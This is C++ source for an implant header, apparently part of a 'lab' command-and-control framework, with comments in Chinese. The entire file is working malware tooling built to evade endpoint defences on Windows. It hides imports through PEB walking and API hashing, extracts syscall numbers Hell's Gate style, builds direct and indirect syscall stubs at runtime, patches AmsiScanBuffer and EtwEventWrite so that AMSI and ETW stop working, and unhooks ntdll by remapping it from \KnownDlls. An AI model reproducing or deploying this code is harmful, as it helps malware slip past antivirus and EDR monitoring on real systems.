#pragma once
// lab-c2/implant/syscall.hpp
// 直接/间接系统调用 + API 哈希解析 + AMSI/ETW 用户态绕过 + ntdll 反 hook
// 仅 x64 / MSVC。不依赖 .asm 文件：系统调用桩在运行时生成到可执行内存。

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <intrin.h>
#include <map>
#include <cstring>

namespace sc {

// ---------------------------------------------------------------- 0. 自建 PEB / Ldr 结构 (x64)
// 不用 SDK 的 PEB_LDR_DATA / LDR_DATA_TABLE_ENTRY: Windows SDK 10.0.26100 把这两个
// 结构的字段换成了 Reserved* 占位, 没有 InLoadOrderModuleList / InLoadOrderLinks /
// BaseDllName, 直接引用会报 C2039 (2026-10-04 实测, loader.cpp 编译失败)。
// 这里按 x64 ntdll 的真实内存布局重新声明, 偏移写在注释里备查。
typedef struct _LCS_PEB_LDR_DATA {
    ULONG      Length;                             // +0x00
    BOOLEAN    Initialized;                        // +0x04
    PVOID      SsHandle;                           // +0x08
    LIST_ENTRY InLoadOrderModuleList;              // +0x10
    LIST_ENTRY InMemoryOrderModuleList;            // +0x20
    LIST_ENTRY InInitializationOrderModuleList;    // +0x30
} LCS_PEB_LDR_DATA, *PLCS_PEB_LDR_DATA;

typedef struct _LCS_LDR_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;               // +0x00
    LIST_ENTRY     InMemoryOrderLinks;             // +0x10
    LIST_ENTRY     InInitializationOrderLinks;     // +0x20
    PVOID          DllBase;                        // +0x30
    PVOID          EntryPoint;                     // +0x38
    ULONG          SizeOfImage;                    // +0x40
    ULONG          _pad44;                         // +0x44
    UNICODE_STRING FullDllName;                    // +0x48
    UNICODE_STRING BaseDllName;                    // +0x58
} LCS_LDR_ENTRY, *PLCS_LDR_ENTRY;

typedef struct _LCS_PEB {
    BYTE               InheritedAddressSpace;      // +0x00
    BYTE               ReadImageFileExecOptions;   // +0x01
    BYTE               BeingDebugged;              // +0x02
    BYTE               BitField;                   // +0x03
    BYTE               _pad04[4];                  // +0x04
    PVOID              Mutant;                     // +0x08
    PVOID              ImageBaseAddress;           // +0x10
    PLCS_PEB_LDR_DATA  Ldr;                        // +0x18
} LCS_PEB, *PLCS_PEB;

inline PLCS_PEB Peb() { return (PLCS_PEB)__readgsqword(0x60); }

// loader 的反调试检查走这里, 不再直接引用 SDK 的 PPEB
inline bool IsBeingDebugged() { return Peb()->BeingDebugged != 0; }

// ---------------------------------------------------------------- 1. 哈希
constexpr DWORD fnv1a(const char* s) {
    DWORD h = 0x811C9DC5;
    while (*s) { h ^= (BYTE)*s++; h *= 0x01000193; }
    return h;
}

constexpr DWORD fnv1a_w(const wchar_t* s) {
    DWORD h = 0x811C9DC5;
    while (*s) {
        wchar_t c = *s++;
        if (c >= L'a' && c <= L'z') c -= 32;      // 模块名统一大写比较
        h ^= (BYTE)c; h *= 0x01000193;
    }
    return h;
}

// ------------------------------------------- 2. PEB->Ldr 手工找模块(不落字符串)
inline HMODULE GetModuleHash(DWORD nameHash) {
    PLCS_PEB_LDR_DATA ldr = Peb()->Ldr;
    if (!ldr) return nullptr;
    LIST_ENTRY* head = &ldr->InLoadOrderModuleList;
    for (LIST_ENTRY* p = head->Flink; p != head; p = p->Flink) {
        auto e = CONTAINING_RECORD(p, LCS_LDR_ENTRY, InLoadOrderLinks);
        if (e->BaseDllName.Buffer && fnv1a_w(e->BaseDllName.Buffer) == nameHash)
            return (HMODULE)e->DllBase;
    }
    return nullptr;
}

inline HMODULE Ntdll() {
    static HMODULE h = GetModuleHash(fnv1a_w(L"ntdll.dll"));
    return h;
}

// ------------------------------------------- 3. 按哈希取导出地址
inline FARPROC GetProcHash(HMODULE mod, DWORD hash) {
    if (!mod) return nullptr;
    auto dos = (PIMAGE_DOS_HEADER)mod;
    auto nt = (PIMAGE_NT_HEADERS)((BYTE*)mod + dos->e_lfanew);
    auto dir = nt->OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT;
    if (!dir->VirtualAddress) return nullptr;
    auto exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)mod + dir->VirtualAddress);
    auto names = (DWORD*)((BYTE*)mod + exp->AddressOfNames);
    auto ords = (WORD*)((BYTE*)mod + exp->AddressOfNameOrdinals);
    auto funcs = (DWORD*)((BYTE*)mod + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const char* n = (const char*)mod + names[i];
        if (fnv1a(n) == hash) return (FARPROC)((BYTE*)mod + funcs[ords[i]]);
    }
    return nullptr;
}

// ------------------------------------------- 4. Hell's Gate 取 SSN
// 若桩被 EDR 挂钩(E9 rel32 / FF25 间接), 先沿 jmp 落到真实桩再匹配
//   mov r10, rcx   ->  4C 8B D1
//   mov eax, ssn   ->  B8 ?? ?? ?? ??
inline BOOL GetSSN(HMODULE hNtdll, LPCSTR name, DWORD* outSsn) {
    BYTE* fn = (BYTE*)GetProcHash(hNtdll, fnv1a(name));
    if (!fn) return FALSE;
    for (int i = 0; i < 16; ++i) {
        if (fn[i] == 0xE9) { fn += 5 + *(INT32*)(fn + 1); continue; }
        if (fn[i] == 0xFF && fn[i + 1] == 0x25) { fn = *(BYTE**)(fn + 6 + *(INT32*)(fn + 2)); continue; }
        break;
    }
    for (int k = 0; k < 32; ++k) {
        if (fn[k] == 0x4C && fn[k + 1] == 0x8B && fn[k + 2] == 0xD1 && fn[k + 3] == 0xB8) {
            *outSsn = *(DWORD*)(fn + k + 4);
            return TRUE;
        }
    }
    return FALSE;
}

// ------------------------------------------- 5. 找 ntdll 里的 syscall; ret 指令
inline BYTE* FindSyscallGadget() {
    HMODULE h = Ntdll();
    if (!h) return nullptr;
    auto nt = (PIMAGE_NT_HEADERS)((BYTE*)h + ((PIMAGE_DOS_HEADER)h)->e_lfanew);
    BYTE* p = (BYTE*)h + nt->OptionalHeader.BaseOfCode;
    BYTE* end = p + nt->OptionalHeader.SizeOfCode - 3;
    for (; p < end; ++p)
        if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3) return p;
    return nullptr;
}

// ------------------------------------------- 6. 运行时造桩
// 直接: 4C 8B D1 | B8 ssn | 0F 05 | C3
// 间接: 4C 8B D1 | B8 ssn | FF 25 00000000 | <gadget>   (返回地址落在 ntdll, 绕 syscall-地址校验)
inline BYTE* BuildStub(DWORD ssn, BYTE* gadget) {
    SIZE_T sz = 64;
    BYTE* m = (BYTE*)VirtualAlloc(nullptr, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!m) return nullptr;
    SIZE_T o = 0;
    m[o++] = 0x4C; m[o++] = 0x8B; m[o++] = 0xD1;              // mov r10, rcx
    m[o++] = 0xB8; *(DWORD*)(m + o) = ssn; o += 4;            // mov eax, ssn
    if (gadget) {
        m[o++] = 0xFF; m[o++] = 0x25; *(DWORD*)(m + o) = 0; o += 4;
        *(BYTE**)(m + o) = gadget; o += 8;                    // jmp [rip+0] -> ntdll!syscall;ret
    } else {
        m[o++] = 0x0F; m[o++] = 0x05;                         // syscall
    }
    m[o++] = 0xC3;                                            // ret
    DWORD old = 0;
    VirtualProtect(m, sz, PAGE_EXECUTE_READ, &old);
    return m;
}

// 间接模式开关: 目标环境有 EDR 用户态校验时置 true
inline BOOL& UseIndirect() { static BOOL v = TRUE; return v; }

inline BYTE* StubFor(LPCSTR name) {
    DWORD ssn = 0;
    if (!GetSSN(Ntdll(), name, &ssn)) return nullptr;
    static std::map<DWORD, BYTE*> cache;
    auto it = cache.find(ssn);
    if (it != cache.end()) return it->second;
    BYTE* s = BuildStub(ssn, UseIndirect() ? FindSyscallGadget() : nullptr);
    cache[ssn] = s;
    return s;
}

// 通用调用: NT 函数原型自定, 这里直传到寄存器
template <typename... A>
NTSTATUS Call(LPCSTR name, A... args) {
    BYTE* s = StubFor(name);
    if (!s) return (NTSTATUS)0xC0000001L;
    return ((NTSTATUS(NTAPI*)(A...))s)(args...);
}

// ------------------------------------------- 7. AMSI / ETW 用户态绕过
inline BOOL PatchAMSI() {
    HMODULE h = GetModuleHash(fnv1a_w(L"amsi.dll"));
    if (!h) return FALSE;
    BYTE* f = (BYTE*)GetProcHash(h, fnv1a("AmsiScanBuffer"));
    if (!f) return FALSE;
    // mov eax, 0x80070057 (E_INVALIDARG) ; ret
    BYTE p[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD old = 0;
    VirtualProtect(f, sizeof(p), PAGE_EXECUTE_READWRITE, &old);
    memcpy(f, p, sizeof(p));
    VirtualProtect(f, sizeof(p), old, &old);
    return TRUE;
}

inline BOOL PatchETW() {
    BYTE* f = (BYTE*)GetProcHash(Ntdll(), fnv1a("EtwEventWrite"));
    if (!f) return FALSE;
    BYTE p[] = { 0x33, 0xC0, 0xC3 };   // xor eax, eax ; ret
    DWORD old = 0;
    VirtualProtect(f, sizeof(p), PAGE_EXECUTE_READWRITE, &old);
    memcpy(f, p, sizeof(p));
    VirtualProtect(f, sizeof(p), old, &old);
    return TRUE;
}

// ------------------------------------------- 8. 反 un-hook: 从 \KnownDlls 重映射干净 ntdll
// 注意: 映射视图故意不关闭, 释放 section 会导致内存失效
inline BOOL UnhookNtdll() {
    HMODULE hNt = Ntdll();
    typedef NTSTATUS(NTAPI* tNtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
    typedef NTSTATUS(NTAPI* tNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T,
                                                 PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
    auto NtOpenSection = (tNtOpenSection)GetProcHash(hNt, fnv1a("NtOpenSection"));
    auto NtMapViewOfSection = (tNtMapViewOfSection)GetProcHash(hNt, fnv1a("NtMapViewOfSection"));
    if (!NtOpenSection || !NtMapViewOfSection) return FALSE;

    WCHAR path[] = { L'\\',L'K',L'n',L'o',L'w',L'n',L'D',L'l',L'l',L's',L'\\',
                     L'n',L't',L'd',L'l',L'l',L'.',L'd',L'l',L'l', 0 };
    UNICODE_STRING us;
    us.Buffer = path;
    us.Length = us.MaximumLength = (USHORT)(wcslen(path) * sizeof(WCHAR));
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

    HANDLE hSec = nullptr;
    if (NtOpenSection(&hSec, SECTION_MAP_READ, &oa) < 0) return FALSE;
    PVOID base = nullptr;
    SIZE_T view = 0;
    if (NtMapViewOfSection(hSec, (HANDLE)-1, &base, 0, 0, nullptr, &view,
                           2 /*ViewUnmap*/, 0, PAGE_READONLY) < 0) return FALSE;

    auto nt = (PIMAGE_NT_HEADERS)((BYTE*)hNt + ((PIMAGE_DOS_HEADER)hNt)->e_lfanew);
    auto sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (!(sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        DWORD old = 0;
        BYTE* dst = (BYTE*)hNt + sec->VirtualAddress;
        VirtualProtect(dst, sec->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &old);
        memcpy(dst, (BYTE*)base + sec->VirtualAddress, sec->Misc.VirtualSize);
        VirtualProtect(dst, sec->Misc.VirtualSize, old, &old);
    }
    return TRUE;
}

} // namespace sc
